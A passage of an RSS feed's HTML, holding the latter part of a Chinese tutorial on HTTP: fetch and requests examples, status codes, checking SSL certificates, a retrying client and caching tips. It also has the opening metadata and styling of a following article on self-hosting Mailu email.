<span class="hljs-comment">// POST请求创建资源</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">createUser</span>(<span class="hljs-params">userData</span>) {
    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">'https://api.example.com/users'</span>, {
        <span class="hljs-attr">method</span>: <span class="hljs-string">'POST'</span>,
        <span class="hljs-attr">headers</span>: {
            <span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>,
        },
        <span class="hljs-attr">body</span>: <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(userData)
    });
    
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> response.<span class="hljs-title function_">json</span>();
}

<span class="hljs-comment">// 调用示例</span>
<span class="hljs-title function_">getUser</span>(<span class="hljs-number">123</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(data));
<span class="hljs-title function_">createUser</span>({<span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span>, <span class="hljs-attr">email</span>: <span class="hljs-string">'zhangsan@example.com'</span>});
</code></pre>
<hr/>
<h2 data-id="heading-12">六、HTTP状态码（Status Codes）</h2>
<p>状态码是服务器对请求的响应状态，由3位数字组成：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3d95e49601474925a259713e5bd33daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=BtZXPHCFVlb5WIL%2FazvKWD2i4jY%3D" alt="image (1).png" loading="lazy"/></p>
<h3 data-id="heading-13">常见状态码速查表</h3>






































































<table><thead><tr><th>代码</th><th>含义</th><th>场景说明</th></tr></thead><tbody><tr><td><strong>200</strong> OK</td><td>请求成功</td><td>最常见的成功状态</td></tr><tr><td><strong>201</strong> Created</td><td>创建成功</td><td>POST创建资源后返回</td></tr><tr><td><strong>301</strong> Moved Permanently</td><td>永久重定向</td><td>网站换域名</td></tr><tr><td><strong>302</strong> Found</td><td>临时重定向</td><td>未登录跳转登录页</td></tr><tr><td><strong>304</strong> Not Modified</td><td>未修改</td><td>浏览器缓存有效</td></tr><tr><td><strong>400</strong> Bad Request</td><td>请求语法错误</td><td>参数格式不对</td></tr><tr><td><strong>401</strong> Unauthorized</td><td>未认证</td><td>缺少Token</td></tr><tr><td><strong>403</strong> Forbidden</td><td>禁止访问</td><td>权限不足</td></tr><tr><td><strong>404</strong> Not Found</td><td>资源不存在</td><td>页面或API找不到</td></tr><tr><td><strong>500</strong> Internal Server Error</td><td>服务器内部错误</td><td>代码抛异常</td></tr><tr><td><strong>502</strong> Bad Gateway</td><td>网关错误</td><td>Nginx转发失败</td></tr><tr><td><strong>503</strong> Service Unavailable</td><td>服务不可用</td><td>服务器过载或维护</td></tr></tbody></table>
<h3 data-id="heading-14">Python处理不同状态码</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests.exceptions <span class="hljs-keyword">import</span> HTTPError

<span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_request</span>(<span class="hljs-params">url</span>):
    <span class="hljs-keyword">try</span>:
        response = requests.get(url)
        response.raise_for_status()  <span class="hljs-comment"># 自动抛出4xx/5xx异常</span>
        
        <span class="hljs-comment"># 处理特定状态码</span>
        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" 请求成功"</span>)
            <span class="hljs-keyword">return</span> response.json()
        <span class="hljs-keyword">elif</span> response.status_code == <span class="hljs-number">304</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" 使用缓存数据"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
            
    <span class="hljs-keyword">except</span> HTTPError <span class="hljs-keyword">as</span> e:
        status = e.response.status_code
        
        <span class="hljs-keyword">if</span> status == <span class="hljs-number">404</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" 资源不存在，请检查URL"</span>)
        <span class="hljs-keyword">elif</span> status == <span class="hljs-number">429</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" 请求过于频繁，请稍后再试"</span>)
        <span class="hljs-keyword">elif</span> status &gt;= <span class="hljs-number">500</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">" 服务器错误，请联系管理员"</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 请求失败: <span class="hljs-subst">{e}</span>"</span>)
            
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>

<span class="hljs-comment"># 测试</span>
safe_request(<span class="hljs-string">"https://api.github.com/users/nonexistent-user-12345"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-15">七、HTTP vs HTTPS：安全传输</h2>
<p>HTTPS = HTTP + SSL/TLS加密层，默认端口443。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a3a57e3fcf74105966133f5dc4a9642~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5oCV5rWq54yr:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770770823&amp;x-signature=geXUsbq1e5XjcCJflUfP7wemyxU%3D" alt="image (3).png" loading="lazy"/></p>
<h3 data-id="heading-16">HTTPS的核心价值</h3>
<ol>
<li><strong>加密（Encryption）</strong>：防止窃听，保护隐私数据</li>
<li><strong>完整性（Integrity）</strong>：防止篡改，确保数据未被修改</li>
<li><strong>身份验证（Authentication）</strong>：验证服务器身份，防止钓鱼网站</li>
</ol>
<h3 data-id="heading-17">检查网站HTTPS配置</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> ssl
<span class="hljs-keyword">import</span> socket
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_ssl_certificate</span>(<span class="hljs-params">hostname</span>):
    <span class="hljs-string">"""
    检查网站的SSL证书信息
    """</span>
    context = ssl.create_default_context()
    <span class="hljs-keyword">with</span> socket.create_connection((hostname, <span class="hljs-number">443</span>), timeout=<span class="hljs-number">5</span>) <span class="hljs-keyword">as</span> sock:
        <span class="hljs-keyword">with</span> context.wrap_socket(sock, server_hostname=hostname) <span class="hljs-keyword">as</span> ssock:
            cert = ssock.getpeercert()
            cipher = ssock.cipher()
            version = ssock.version()
            
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 域名: <span class="hljs-subst">{hostname}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 证书颁发者: <span class="hljs-subst">{cert.get(<span class="hljs-string">'issuer'</span>)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 有效期至: <span class="hljs-subst">{cert.get(<span class="hljs-string">'notAfter'</span>)}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 协议版本: <span class="hljs-subst">{version}</span>"</span>)  <span class="hljs-comment"># 如 TLSv1.3</span>
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f" 加密套件: <span class="hljs-subst">{cipher[<span class="hljs-number">0</span>]}</span>"</span>)

<span class="hljs-comment"># 检查示例</span>
check_ssl_certificate(<span class="hljs-string">"www.google.com"</span>)
</code></pre>
<hr/>
<h2 data-id="heading-18">八、实战：构建完整的HTTP客户端</h2>
<p>以下是一个生产级的Python HTTP客户端示例，展示了最佳实践：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> requests.adapters <span class="hljs-keyword">import</span> HTTPAdapter
<span class="hljs-keyword">from</span> urllib3.util.retry <span class="hljs-keyword">import</span> Retry
<span class="hljs-keyword">import</span> logging
<span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Optional</span>, <span class="hljs-type">Dict</span>, <span class="hljs-type">Any</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">HTTPClient</span>:
    <span class="hljs-string">"""
    生产级HTTP客户端封装
    功能：自动重试、超时控制、日志记录、连接池
    """</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, max_retries: <span class="hljs-built_in">int</span> = <span class="hljs-number">3</span>, timeout: <span class="hljs-built_in">int</span> = <span class="hljs-number">30</span></span>):
        self.session = requests.Session()
        self.timeout = timeout
        
        <span class="hljs-comment"># 配置重试策略</span>
        retry_strategy = Retry(
            total=max_retries,
            backoff_factor=<span class="hljs-number">1</span>,  <span class="hljs-comment"># 重试间隔 1s, 2s, 4s...</span>
            status_forcelist=[<span class="hljs-number">429</span>, <span class="hljs-number">500</span>, <span class="hljs-number">502</span>, <span class="hljs-number">503</span>, <span class="hljs-number">504</span>],
            allowed_methods=[<span class="hljs-string">"HEAD"</span>, <span class="hljs-string">"GET"</span>, <span class="hljs-string">"OPTIONS"</span>, <span class="hljs-string">"POST"</span>, <span class="hljs-string">"PUT"</span>]
        )
        
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=<span class="hljs-number">10</span>,
            pool_maxsize=<span class="hljs-number">10</span>
        )
        
        self.session.mount(<span class="hljs-string">"http://"</span>, adapter)
        self.session.mount(<span class="hljs-string">"https://"</span>, adapter)
        
        <span class="hljs-comment"># 设置通用请求头</span>
        self.session.headers.update({
            <span class="hljs-string">'User-Agent'</span>: <span class="hljs-string">'Mozilla/5.0 (compatible; MyBot/1.0)'</span>,
            <span class="hljs-string">'Accept'</span>: <span class="hljs-string">'application/json'</span>,
            <span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip, deflate'</span>
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span>, params: <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>] = <span class="hljs-literal">None</span>, **kwargs</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-string">"""
        发送GET请求
        """</span>
        <span class="hljs-keyword">try</span>:
            response = self.session.get(
                url, 
                params=params, 
                timeout=self.timeout,
                **kwargs
            )
            response.raise_for_status()
            <span class="hljs-keyword">return</span> response.json()
            
        <span class="hljs-keyword">except</span> requests.exceptions.Timeout:
            logging.error(<span class="hljs-string">f" 请求超时: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> requests.exceptions.ConnectionError:
            logging.error(<span class="hljs-string">f" 连接错误: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> requests.exceptions.HTTPError <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f" HTTP错误 <span class="hljs-subst">{e.response.status_code}</span>: <span class="hljs-subst">{url}</span>"</span>)
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f" 未知错误: <span class="hljs-subst">{e}</span>"</span>)
        
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">post_json</span>(<span class="hljs-params">self, url: <span class="hljs-built_in">str</span>, data: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, <span class="hljs-type">Any</span>]</span>) -&gt; <span class="hljs-type">Optional</span>[<span class="hljs-type">Dict</span>]:
        <span class="hljs-string">"""
        发送JSON格式的POST请求
        """</span>
        headers = {<span class="hljs-string">'Content-Type'</span>: <span class="hljs-string">'application/json'</span>}
        <span class="hljs-keyword">try</span>:
            response = self.session.post(
                url, 
                json=data, 
                headers=headers,
                timeout=self.timeout
            )
            response.raise_for_status()
            <span class="hljs-keyword">return</span> response.json()
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            logging.error(<span class="hljs-string">f"POST请求失败: <span class="hljs-subst">{e}</span>"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""关闭连接池"""</span>
        self.session.close()

<span class="hljs-comment"># 使用示例</span>
<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    client = HTTPClient(max_retries=<span class="hljs-number">3</span>)
    
    <span class="hljs-comment"># GET请求</span>
    user_data = client.get(<span class="hljs-string">"https://api.github.com/users/octocat"</span>)
    <span class="hljs-keyword">if</span> user_data:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"用户: <span class="hljs-subst">{user_data[<span class="hljs-string">'login'</span>]}</span>, 粉丝: <span class="hljs-subst">{user_data[<span class="hljs-string">'followers'</span>]}</span>"</span>)
    
    <span class="hljs-comment"># POST请求</span>
    result = client.post_json(<span class="hljs-string">"https://httpbin.org/post"</span>, {<span class="hljs-string">"key"</span>: <span class="hljs-string">"value"</span>})
    <span class="hljs-keyword">if</span> result:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"响应数据: <span class="hljs-subst">{result[<span class="hljs-string">'json'</span>]}</span>"</span>)
    
    client.close()
</code></pre>
<hr/>
<h2 data-id="heading-19">九、HTTP性能优化技巧</h2>
<h3 data-id="heading-20">1. 启用压缩（减少70%传输体积）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 请求时声明接受gzip压缩</span>
headers = {<span class="hljs-string">'Accept-Encoding'</span>: <span class="hljs-string">'gzip, deflate, br'</span>}
response = requests.get(url, headers=headers)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"原始大小: <span class="hljs-subst">{<span class="hljs-built_in">len</span>(response.content)}</span> bytes"</span>)
</code></pre>
<h3 data-id="heading-21">2. 使用连接池（避免频繁建立TCP连接）</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># requests.Session自动维护连接池</span>
session = requests.Session()
<span class="hljs-comment"># 复用session发送多个请求，比每次新建requests.get()快3-5倍</span>
</code></pre>
<h3 data-id="heading-22">3. 合理设置缓存策略</h3>
<pre><code class="hljs language-http" lang="http"># 响应头设置
Cache-Control: max-age=3600, public  # 缓存1小时
ETag: "33a64df5"                    # 协商缓存标识
Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT
</code></pre>
<h3 data-id="heading-23">4. HTTP/2 服务器推送（Server Push）</h3>
<p>虽然现代Web推荐使用预加载（Preload）替代，但了解其原理有助于理解HTTP/2的多路复用优势。</p>
<hr/>
<h2 data-id="heading-24">十、总结</h2>
<p>HTTP协议是Web开发的基石，理解它的工作原理对前后端开发都至关重要：</p>





























<table><thead><tr><th>知识点</th><th>核心要点</th></tr></thead><tbody><tr><td><strong>模型</strong></td><td>请求-响应模式，无状态协议</td></tr><tr><td><strong>版本</strong></td><td>HTTP/1.1使用最广泛，HTTP/2性能最优，HTTP/3是未来趋势</td></tr><tr><td><strong>方法</strong></td><td>GET用于查询，POST用于创建，PUT/PATCH用于更新，DELETE用于删除</td></tr><tr><td><strong>状态码</strong></td><td>2xx成功，3xx重定向，4xx客户端错，5xx服务器错</td></tr><tr><td><strong>安全</strong></td><td>生产环境务必使用HTTPS（TLS 1.2+）</td></tr></tbody></table>
<blockquote>
<p><strong>学习建议</strong>：使用浏览器的开发者工具（F12 → Network标签）观察真实网站的HTTP请求，这是最直观的学习方式。</p>
</blockquote>
<hr/>
<p><strong>参考图表文件：</strong></p>
<ul>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTP工作流程图</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTP状态码详解</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTP演进史</a></li>
<li><a title="" ref="nofollow noopener noreferrer" href="https://link.juejin.cn?target=">HTTP vs HTTPS对比</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[自己搭邮件服务器有多难？我用 Mailu 跑通了整套企业邮箱]]></title>    <link>https://juejin.cn/post/7602488966610108454</link>    <guid>https://juejin.cn/post/7602488966610108454</guid>    <pubDate>2026-02-03T15:11:43.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602488966610108454" data-draft-id="7602154088476819494" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="自己搭邮件服务器有多难？我用 Mailu 跑通了整套企业邮箱"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-02-03T15:11:43.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="GetcharZp"/> <meta itemprop="url" content="https://juejin.cn/user/4328150938692264"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            自己搭邮件服务器有多难？我用 Mailu 跑通了整套企业邮箱
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4328150938692264/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    GetcharZp
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T15:11:43.000Z" title="Tue Feb 03 2026 15:11:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    5
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:2;font-weight:400;font-size:15px;overflow-x:hidden;color:#333;letter-spacing:1.2px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1:first-child,.markdown-body h2:first-child,.markdown-body h3:first-child,.markdown-body h4:first-child,.markdown-body h5:first-child,.markdown-body h6:first-child{margin-top:-1.5rem;margin-bottom:1rem}.markdown-body h1:before,.markdown-body h2:before,.markdown-body h3:before,.markdown-body h4:before,.markdown-body h5:before,.markdown-body h6:before{content:"#";display:inline-block;color:#3eaf7c;padding-right:.23em}.markdown-body h1{position:relative;font-size:2.5rem;margin-bottom:5px}.markdown-body h1:before{font-size:2.5rem}.markdown-body h2{padding-bottom:.5rem;font-size:2.2rem;border-bottom:1px solid #ececec}.markdown-body h3{font-size:1.5rem;padding-bottom:0}.markdown-body h4{font-size:1.25rem}.markdown-body h5{font-size:1rem}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body strong{color:#3eaf7c}.markdown-body img{max-width:100%;border-radius:2px;display:block;margin:auto}.markdown-body hr{border:none;border-top:1px solid #3eaf7c;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;overflow-x:auto;padding:.2rem .5rem;margin:0;color:#3eaf7c;font-size:.85em;background-color:rgba(27,31,35,.05);border-radius:3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:.5rem solid #3eaf7c}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{font-weight:500;text-decoration:none;color:#3eaf7c;margin:0 5px}.markdown-body a:active,.markdown-body a:hover{text-decoration:none;border-bottom:1.5px solid #3eaf7c}.markdown-body a[href^=http]:after{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTQiIGhlaWdodD0iMTQiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04MzIgMTI4SDY0MHY2NGgxNDYuNzUyTDUyMS4zNzYgNDU3LjM3Nmw0NS4yNDggNDUuMjQ4TDgzMiAyMzcuMjQ4VjM4NGg2NFYxMjh6IiBmaWxsPSIjM2VhZjdjIi8+PHBhdGggZD0iTTc2OCA4MzJIMTkyVjI1NmgzNTJ2LTY0SDE2MGEzMiAzMiAwIDAwLTMyIDMydjY0MGEzMiAzMiAwIDAwMzIgMzJoNjQwYTMyIDMyIDAgMDAzMi0zMlY0ODBoLTY0djM1MnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");margin-left:2px}.markdown-body a[href^="#"]:before{content:"#"}.markdown-body table{display:inline-block!important;font-size:13px;width:auto;max-width:100%;overflow:auto;border:1px solid #3eaf7c;border-collapse:collapse}.markdown-body thead{background:#3eaf7c;color:#fff;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(153,255,188,.1)}.markdown-body td,.markdown-body th{padding:4px 8px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#7b7878;padding:1px 23px;border-left:.5rem solid;border-color:#42b983;background-color:rgba(66,184,131,.1);position:relative;margin:14px 8px 0}.markdown-body blockquote:before{display:inline-block;position:absolute;content:url("data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjUiIGhlaWdodD0iMjUiIHZpZXdCb3g9IjAgMCAyNyAyNyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48ZyB0cmFuc2Zvcm09InRyYW5zbGF0ZSgxLjg2MiAxLjg2MikiIGZpbGwtcnVsZT0ibm9uemVybyIgZmlsbD0ibm9uZSI+PGNpcmNsZSBzdHJva2U9IiNGRkYiIHN0cm9rZS13aWR0aD0iMS43MjQiIGZpbGw9IiM0MkI5ODMiIGN4PSIxMS42MzgiIGN5PSIxMS42MzgiIHI9IjExLjYzOCIvPjxwYXRoIGQ9Ik0xNC45NzggNi4yN0E1LjAwNiA1LjAwNiAwIDAwNi42NyA5LjQ2OGE0LjkwMSA0LjkwMSAwIDAwMS43NzMgNC4zNjJjLjMyMy4yNTguNTE0LjY0Ny41MjIgMS4wNnYxLjA2YTIuNjg1IDIuNjg1IDAgMDA1LjM3IDB2LTEuMDA4Yy4wMDItLjM5OC4xNzMtLjc3Ny40Ny0xLjA0MmE1LjAyMyA1LjAyMyAwIDAwLjE3My03LjYzem0tMy4zMzcgMTAuOTY3YTEuMzA0IDEuMzA0IDAgMDEtMS4yODYtMS4yODd2LS4yNzhoMi41NzJ2LjI2MWMwIC43MTMtLjU3MyAxLjI5NC0xLjI4NiAxLjMwNHptMi4yNi00LjQxNWMtLjQ0LjM4My0uNzUuODkzLS44ODcgMS40NmgtMi43NDZhMi44NjggMi44NjggMCAwMC0uOTM4LTEuNTNoLS4wMThhMy40NzYgMy40NzYgMCAwMS0xLjI2OS0zLjE0NSAzLjYxNSAzLjYxNSAwIDAxNy4xOTYuNCAzLjY1IDMuNjUgMCAwMS0xLjMzOCAyLjgxNXoiIGZpbGw9IiNGRkYiLz48L2c+PC9zdmc+");width:25px;height:25px;left:-16px;top:12px}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{outline:none;border:none;border-left:4px solid #3eaf7c;padding-left:10px;margin-left:4px}.markdown-body details summary{cursor:pointer;border:none;outline:none;background:#fff;margin:0 -17px}.markdown-body details summary::-webkit-details-marker{color:#3eaf7c}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ol li::marker{color:#3eaf7c}.markdown-body ul li{list-style:none;padding-left:10px}.markdown-body ul li::marker{content:"•";color:#3eaf7c}.markdown-body ul li.task-list-item:before{content:"";margin-right:0}.markdown-body input[type=checkbox]{vertical-align:text-bottom;box-shadow:inset 0 0 0 10px #fff}.markdown-body input[type=checkbox]:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik04NzcuMDU2IDE0Ni45NDR2NzMwLjExMkgxNDYuOTQ0VjE0Ni45NDRoNzMwLjExMnptMC0xMDQuMjc3SDE0Ni45NDRjLTU3LjYyOCAwLTEwNC4yNzcgNDYuNjQ5LTEwNC4yNzcgMTA0LjI3N3Y3MzAuMTEyYzAgNTcuNjI4IDQ2LjY0OSAxMDQuMjc3IDEwNC4yNzcgMTA0LjI3N2g3MzAuMTEyYzU3LjYyOCAwIDEwNC4yNzctNDYuNjQ5IDEwNC4yNzctMTA0LjI3N1YxNDYuOTQ0YzAtNTcuNjI4LTQ2LjY0OS0xMDQuMjc3LTEwNC4yNzctMTA0LjI3N3oiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}.markdown-body input[type=checkbox]:checked:before{content:url("data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTUiIGhlaWdodD0iMTUiPjxkZWZzPjxzdHlsZS8+PC9kZWZzPjxwYXRoIGQ9Ik05MTAuMjA4IDBIMTEzLjc2QTExNC4xMTIgMTE0LjExMiAwIDAwLS4wMzIgMTEzLjc5MlY5MTAuMjRjMCA2Mi41OTIgNTEuMiAxMTMuNzkyIDExMy43OTIgMTEzLjc5Mmg3OTYuNDQ4YzYyLjU5MiAwIDExMy43OTItNTEuMiAxMTMuNzkyLTExMy43OTJWMTEzLjc5MkMxMDI0IDUxLjIgOTcyLjggMCA5MTAuMjA4IDB6bS01MTIgNzk2LjQ0OEwxMTMuNzYgNTEybDc5LjY0OC03OS42NDggMjA0LjggMjA0LjhMODMwLjU2IDIwNC44bDc5LjY0OCA3OS42NDgtNTEyIDUxMnoiIGZpbGw9IiMzZWFmN2MiLz48L3N2Zz4=");position:relative;top:-2px;right:2px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="monokai">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#272822;color:#ddd}.hljs-keyword,.hljs-literal,.hljs-name,.hljs-selector-tag,.hljs-strong,.hljs-tag{color:#f92672}.hljs-code{color:#66d9ef}.hljs-class 